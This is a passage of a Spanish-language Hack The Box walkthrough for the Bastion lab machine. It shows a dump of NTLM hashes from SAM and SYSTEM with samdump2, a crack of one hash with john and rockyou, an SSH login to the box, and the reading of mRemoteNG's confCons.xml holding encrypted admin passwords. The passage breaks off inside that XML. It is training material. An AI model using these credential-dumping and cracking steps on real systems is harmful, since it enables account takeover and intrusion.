+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS<span class="o">{</span>6cced2ec-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TxR.0.regtrans-ms
+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS<span class="o">{</span>6cced2ec-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TxR.1.regtrans-ms
+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS<span class="o">{</span>6cced2ec-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TxR.2.regtrans-ms
+.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:46 2019  COMPONENTS<span class="o">{</span>6cced2ec-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TxR.blf
+.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:21 2019  COMPONENTS<span class="o">{</span>6cced2ed-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TM.blf
+.rwxrwxrwx root root 512 KB Fri Feb 22 06:38:21 2019  COMPONENTS<span class="o">{</span>6cced2ed-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TMContainer00000000000000000001.regtrans-ms
+.rwxrwxrwx root root 512 KB Mon Jul 13 23:46:45 2009  COMPONENTS<span class="o">{</span>6cced2ed-6e01-11de-8bed-001e0bcd1824<span class="o">}</span>.TMContainer00000000000000000002.regtrans-ms
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  DEFAULT
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  DEFAULT.LOG
+.rwxrwxrwx root root  89 KB Fri Feb 22 06:43:54 2019  DEFAULT.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  DEFAULT.LOG2
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:39:21 2019  SAM
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SAM.LOG
+.rwxrwxrwx root root  21 KB Fri Feb 22 06:39:21 2019  SAM.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SAM.LOG2
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SECURITY
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SECURITY.LOG
+.rwxrwxrwx root root  21 KB Fri Feb 22 06:43:54 2019  SECURITY.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SECURITY.LOG2
+.rwxrwxrwx root root  23 MB Fri Feb 22 06:43:54 2019  SOFTWARE
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  SOFTWARE.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SOFTWARE.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SOFTWARE.LOG2
+.rwxrwxrwx root root 9.3 MB Fri Feb 22 06:43:54 2019  SYSTEM
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SYSTEM.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SYSTEM.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SYSTEM.LOG2
+</code></pre></div></div>
+
+<p>Dentro podemos encontrar los archivos <code class="language-plaintext highlighter-rouge">SAM</code> y <code class="language-plaintext highlighter-rouge">SYSTEM</code>; que en conjunto podemos obtener los hashes de los usarios a nivel de sistema. Por lo tanto, haremos uso de la herramienta <code class="language-plaintext highlighter-rouge">samdump2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ samdump2 SYSTEM SAM
+<span class="k">*</span>disabled<span class="k">*</span> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="k">*</span>disabled<span class="k">*</span> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+</code></pre></div></div>
+
+<p>Como ya tenemos hashes de los usuarios, vamos a tratar de romperlos con <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--format</span><span class="o">=</span>NT <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts <span class="o">(</span>NT <span class="o">[</span>MD4 256/256 AVX2 8x3]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>8
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+                 <span class="o">(</span><span class="k">*</span>disabled<span class="k">*</span> Administrator<span class="o">)</span>
+bureaulampje     <span class="o">(</span>L4mpje<span class="o">)</span>
+2g 0:00:00:00 DONE <span class="o">(</span>2022-03-18 22:12<span class="o">)</span> 3.076g/s 14454Kp/s 14454Kc/s 14462KC/s burg772v..burdy1
+Warning: passwords printed above might not be all those cracked
+Use the <span class="s2">"--show --format=NT"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Tenemos la contraseña del usuario <strong>L4mpje</strong> y como siempre, vamos a guardarlas para no olvidarlas despúes. Si recordamos, tenemos el puerto 22 abierto, por lo tanto vamos a tratar de conectarnos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh L4mpje@10.10.10.134
+L4mpje@10.10.10.134<span class="s1">'s password:
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt;whoami                                                                                           
+bastion\l4mpje                                                                                                                  
+
+l4mpje@BASTION C:\Users\L4mpje&gt;
+</span></code></pre></div></div>
+
+<p>Ya ingresamos a la máquina y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver la forma de escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\D</span>esktop&gt;whoami /priv                                                                             
+
+PRIVILEGES INFORMATION                                                                                                          
+<span class="nt">----------------------</span>                                                                                                          
+
+Privilege Name                Description                    State                                                              
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>                                                            
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled                                                            
+
+l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\D</span>esktop&gt;
+l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\D</span>esktop&gt;cd C:<span class="se">\ </span>                                                                                  
+
+l4mpje@BASTION C:<span class="se">\&gt;</span><span class="nb">dir                                                                                                          
+ </span>Volume <span class="k">in </span>drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:<span class="se">\ </span>                                                                                                              
+
+19-03-2022  04:18    &lt;DIR&gt;          Backups                                                                                     
+12-09-2016  12:35    &lt;DIR&gt;          Logs                                                                                        
+22-02-2019  14:42    &lt;DIR&gt;          PerfLogs                                                                                    
+31-01-2022  17:39    &lt;DIR&gt;          Program Files                                                                               
+22-02-2019  14:01    &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>                                                                         
+22-02-2019  13:50    &lt;DIR&gt;          Users                                                                                       
+31-01-2022  17:52    &lt;DIR&gt;          Windows                                                                                     
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes                                                                                   
+               7 Dir<span class="o">(</span>s<span class="o">)</span>   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:<span class="se">\&gt;</span><span class="nb">cd </span>PROGRA~1                                                                                                  
+
+l4mpje@BASTION C:<span class="se">\P</span>ROGRA~1&gt;dir                                                                                                  
+ Volume <span class="k">in </span>drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:<span class="se">\P</span>ROGRA~1                                                                                                       
+
+31-01-2022  17:39    &lt;DIR&gt;          <span class="nb">.</span>                                                                                           
+31-01-2022  17:39    &lt;DIR&gt;          ..                                                                                          
+16-04-2019  11:18    &lt;DIR&gt;          Common Files                                                                                
+23-02-2019  09:38    &lt;DIR&gt;          Internet Explorer                                                                           
+22-02-2019  14:19    &lt;DIR&gt;          OpenSSH-Win64                                                                               
+22-02-2019  14:08    &lt;DIR&gt;          PackageManagement                                                                           
+31-01-2022  17:39    &lt;DIR&gt;          VMware                                                                                      
+23-02-2019  10:22    &lt;DIR&gt;          Windows Defender                                                                            
+23-02-2019  09:38    &lt;DIR&gt;          Windows Mail                                                                                
+23-02-2019  10:22    &lt;DIR&gt;          Windows Media Player                                                                        
+16-07-2016  14:23    &lt;DIR&gt;          Windows Multimedia Platform                                                                 
+16-07-2016  14:23    &lt;DIR&gt;          Windows NT                                                                                  
+23-02-2019  10:22    &lt;DIR&gt;          Windows Photo Viewer                                                                        
+16-07-2016  14:23    &lt;DIR&gt;          Windows Portable Devices                                                                    
+22-02-2019  14:08    &lt;DIR&gt;          WindowsPowerShell                                                                           
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes                                                                                   
+              15 Dir<span class="o">(</span>s<span class="o">)</span>   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:<span class="se">\P</span>ROGRA~1&gt;cd ..                                                                                                
+
+l4mpje@BASTION C:<span class="se">\&gt;</span><span class="nb">cd </span>PROGRA~2                                                                                                  
+
+l4mpje@BASTION C:<span class="se">\P</span>ROGRA~2&gt;dir                                                                                                  
+ Volume <span class="k">in </span>drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:<span class="se">\P</span>ROGRA~2                                                                                                       
+
+22-02-2019  14:01    &lt;DIR&gt;          <span class="nb">.</span>                                                                                           
+22-02-2019  14:01    &lt;DIR&gt;          ..                                                                                          
+16-07-2016  14:23    &lt;DIR&gt;          Common Files                                                                                
+23-02-2019  09:38    &lt;DIR&gt;          Internet Explorer                                                                           
+16-07-2016  14:23    &lt;DIR&gt;          Microsoft.NET                                                                               
+22-02-2019  14:01    &lt;DIR&gt;          mRemoteNG                                                                                   
+23-02-2019  10:22    &lt;DIR&gt;          Windows Defender                                                                            
+23-02-2019  09:38    &lt;DIR&gt;          Windows Mail                                                                                
+23-02-2019  10:22    &lt;DIR&gt;          Windows Media Player                                                                        
+16-07-2016  14:23    &lt;DIR&gt;          Windows Multimedia Platform                                                                 
+16-07-2016  14:23    &lt;DIR&gt;          Windows NT                                                                                  
+23-02-2019  10:22    &lt;DIR&gt;          Windows Photo Viewer                                                                        
+16-07-2016  14:23    &lt;DIR&gt;          Windows Portable Devices                                                                    
+16-07-2016  14:23    &lt;DIR&gt;          WindowsPowerShell                                                                           
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes                                                                                   
+              14 Dir<span class="o">(</span>s<span class="o">)</span>   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:<span class="se">\P</span>ROGRA~2&gt;
+</code></pre></div></div>
+
+<p>Ya vemos algo que nos llama la atención y es el programa <strong>mRemoteNG</strong> y resulta que dicho programa contiene credenciales las cuales se pueden descifrar; por lo tanto nos vamos a la ruta del archivo de configuración:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l4mpje@BASTION C:<span class="se">\P</span>ROGRA~2&gt;cd %HOME%/AppData/Roaming/mRemoteNG                                                                  
+
+l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG&gt;dir                                                                    
+ Volume <span class="k">in </span>drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG                                                                         
+
+22-02-2019  14:03    &lt;DIR&gt;          <span class="nb">.</span>                                                                                           
+22-02-2019  14:03    &lt;DIR&gt;          ..                                                                                          
+22-02-2019  14:03             6.316 confCons.xml                                                                                
+22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
+22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
+22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
+22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
+22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
+22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
+22-02-2019  14:03                51 extApps.xml                                                                                 
+22-02-2019  14:03             5.217 mRemoteNG.log                                                                               
+22-02-2019  14:03             2.245 pnlLayout.xml                                                                               
+22-02-2019  14:01    &lt;DIR&gt;          Themes                                                                                      
+              14 File<span class="o">(</span>s<span class="o">)</span>         76.577 bytes                                                                                   
+               3 Dir<span class="o">(</span>s<span class="o">)</span>   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG&gt;
+</code></pre></div></div>
+
+<p>El archivo que nos interesa es <code class="language-plaintext highlighter-rouge">confCons.xml</code>, por lo tanto le echamos un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG&gt;type confCons.xml                                                       
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;                                                                                           
+&lt;mrng:Connections xmlns:mrng<span class="o">=</span><span class="s2">"http://mremoteng.org"</span> <span class="nv">Name</span><span class="o">=</span><span class="s2">"Connections"</span> <span class="nv">Export</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EncryptionEngine</span><span class="o">=</span><span class="s2">"AES"</span> <span class="nv">BlockCipherMode</span><span class="o">=</span><span class="s2">"GC 
+M"</span> <span class="nv">KdfIterations</span><span class="o">=</span><span class="s2">"1000"</span> <span class="nv">FullFileEncryption</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Protected</span><span class="o">=</span><span class="s2">"ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0 
+oop8R8ddXKAx4KK7sAk6AA"</span> <span class="nv">ConfVersion</span><span class="o">=</span><span class="s2">"2.6"</span><span class="o">&gt;</span>                                                                                       
+    &lt;Node <span class="nv">Name</span><span class="o">=</span><span class="s2">"DC"</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">"Connection"</span> <span class="nv">Descr</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Icon</span><span class="o">=</span><span class="s2">"mRemoteNG"</span> <span class="nv">Panel</span><span class="o">=</span><span class="s2">"General"</span> <span class="nv">Id</span><span class="o">=</span><span class="s2">"500e7d58-662a-44d4-aff0-3a4f547a3fee"</span> Userna 
+<span class="nv">me</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> 
+ <span class="nv">Hostname</span><span class="o">=</span><span class="s2">"127.0.0.1"</span> <span class="nv">Protocol</span><span class="o">=</span><span class="s2">"RDP"</span> <span class="nv">PuttySession</span><span class="o">=</span><span class="s2">"Default Settings"</span> <span class="nv">Port</span><span class="o">=</span><span class="s2">"3389"</span> <span class="nv">ConnectToConsole</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">UseCredSsp</span><span class="o">=</span><span class="s2">"true"</span> Rend 
+<span class="nv">eringEngine</span><span class="o">=</span><span class="s2">"IE"</span> <span class="nv">ICAEncryptionStrength</span><span class="o">=</span><span class="s2">"EncrBasic"</span> <span class="nv">RDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"NoAuth"</span> <span class="nv">RDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"0"</span> RDPAlertIdleTimeo 
+<span class="nv">ut</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">LoadBalanceInfo</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Colors</span><span class="o">=</span><span class="s2">"Colors16Bit"</span> <span class="nv">Resolution</span><span class="o">=</span><span class="s2">"FitToWindow"</span> <span class="nv">AutomaticResize</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">DisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> Disp 
+<span class="nv">layThemes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableFontSmoothing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">CacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> R 
+<span class="nv">edirectPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSound</span><span class="o">=</span><span class="s2">"DoNotPlay"</span> <span class="nv">SoundQuality</span><span class="o">=</span><span class="s2">"Dynamic"</span> Redire 
+<span class="nv">ctKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Connected</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">PostExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">MacAddress</span><span class="o">=</span><span class="s2">""</span> <span class="nv">UserField</span><span class="o">=</span><span class="s2">""</span> <span class="nv">ExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCCompression</span><span class="o">=</span><span class="s2">"CompNone"</span> VNCEn 
+<span class="nv">coding</span><span class="o">=</span><span class="s2">"EncHextile"</span> <span class="nv">VNCAuthMode</span><span class="o">=</span><span class="s2">"AuthVNC"</span> <span class="nv">VNCProxyType</span><span class="o">=</span><span class="s2">"ProxyNone"</span> <span class="nv">VNCProxyIP</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCProxyPort</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">VNCProxyUsername</span><span class="o">=</span><span class="s2">""</span> VNCProxyPa 
+<span class="nv">ssword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCColors</span><span class="o">=</span><span class="s2">"ColNormal"</span> <span class="nv">VNCSmartSizeMode</span><span class="o">=</span><span class="s2">"SmartSAspect"</span> <span class="nv">VNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"Never"</span> RDGatewayHostna 
+<span class="nv">me</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"Yes"</span> <span class="nv">RDGatewayUsername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayDomain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">InheritCacheBitmaps</span><span class="o">=</span><span class="s2">" 
+false"</span> <span class="nv">InheritColors</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDescription</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> InheritEnab 
+<span class="nv">leFontSmoothing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritEnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDomain</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritIcon</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPanel</span><span class="o">=</span><span class="s2">"false"</span> I 
+<span class="nv">nheritPassword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritProtocol</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPuttySession</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> 
+ <span class="nv">InheritRedirectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> Inhe 
+<span class="nv">ritRedirectSound</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritSoundQuality</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritResolution</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritAutomaticResize</span><span class="o">=</span><span class="s2">"false"</span> InheritUseConsoleS 
+<span class="nv">ession</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseCredSsp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRenderingEngine</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritICAEncryptionStrength</span><span class="o">=</span><span class="s2">"fa 
+lse"</span> <span class="nv">InheritRDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> InheritLoad 
+<span class="nv">BalanceInfo</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPreExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPostExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritMacAddress</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUserField</span><span class="o">=</span><span class="s2">"false"</span> Inheri 
+<span class="nv">tExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCCompression</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCEncoding</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCAuthMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyType</span><span class="o">=</span><span class="s2">"false"</span>  
+<span class="nv">InheritVNCProxyIP</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPassword</span><span class="o">=</span><span class="s2">"false"</span> InheritVNC 
+<span class="nv">Colors</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCSmartSizeMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"false"</span> InheritRDGatewayHo 
+<span class="nv">stname</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayPassword</span><span class="o">=</span><span class="s2">"false 
+"</span> <span class="nv">InheritRDGatewayDomain</span><span class="o">=</span><span class="s2">"false"</span> /&gt;
+    &lt;Node <span class="nv">Name</span><span class="o">=</span><span class="s2">"L4mpje-PC"</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">"Connection"</span> <span class="nv">Descr</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Icon</span><span class="o">=</span><span class="s2">"mRemoteNG"</span> <span class="nv">Panel</span><span class="o">=</span><span class="s2">"General"</span> <span class="nv">Id</span><span class="o">=</span><span class="s2">"8d3579b2-e68e-48c1-8f0f-9ee1347c9128"</span>
+ <span class="nv">Username</span><span class="o">=</span><span class="s2">"L4mpje"</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">"yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"</span> Hostnam
+<span class="nv">e</span><span class="o">=</span><span class="s2">"192.168.1.75"</span> <span class="nv">Protocol</span><span class="o">=</span><span class="s2">"RDP"</span> <span class="nv">PuttySession</span><span class="o">=</span><span class="s2">"Default Settings"</span> <span class="nv">Port</span><span class="o">=</span><span class="s2">"3389"</span> <span class="nv">ConnectToConsole</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">UseCredSsp</span><span class="o">=</span><span class="s2">"true"</span> Rendering
+<span class="nv">Engine</span><span class="o">=</span><span class="s2">"IE"</span> <span class="nv">ICAEncryptionStrength</span><span class="o">=</span><span class="s2">"EncrBasic"</span> <span class="nv">RDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"NoAuth"</span> <span class="nv">RDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">RDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"f
+alse"</span> <span class="nv">LoadBalanceInfo</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Colors</span><span class="o">=</span><span class="s2">"Colors16Bit"</span> <span class="nv">Resolution</span><span class="o">=</span><span class="s2">"FitToWindow"</span> <span class="nv">AutomaticResize</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">DisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> DisplayTh
+<span class="nv">emes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableFontSmoothing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">CacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> Redire
+<span class="nv">ctPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSound</span><span class="o">=</span><span class="s2">"DoNotPlay"</span> <span class="nv">SoundQuality</span><span class="o">=</span><span class="s2">"Dynamic"</span> RedirectKey
+<span class="nv">s</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Connected</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">PostExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">MacAddress</span><span class="o">=</span><span class="s2">""</span> <span class="nv">UserField</span><span class="o">=</span><span class="s2">""</span> <span class="nv">ExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCCompression</span><span class="o">=</span><span class="s2">"CompNone"</span> VNCEncodin
+<span class="nv">g</span><span class="o">=</span><span class="s2">"EncHextile"</span> <span class="nv">VNCAuthMode</span><span class="o">=</span><span class="s2">"AuthVNC"</span> <span class="nv">VNCProxyType</span><span class="o">=</span><span class="s2">"ProxyNone"</span> <span class="nv">VNCProxyIP</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCProxyPort</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">VNCProxyUsername</span><span class="o">=</span><span class="s2">""</span> VNCProxyPasswor
+<span class="nv">d</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCColors</span><span class="o">=</span><span class="s2">"ColNormal"</span> <span class="nv">VNCSmartSizeMode</span><span class="o">=</span><span class="s2">"SmartSAspect"</span> <span class="nv">VNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"Never"</span> <span class="nv">RDGatewayHostname</span><span class="o">=</span><span class="s2">""</span>
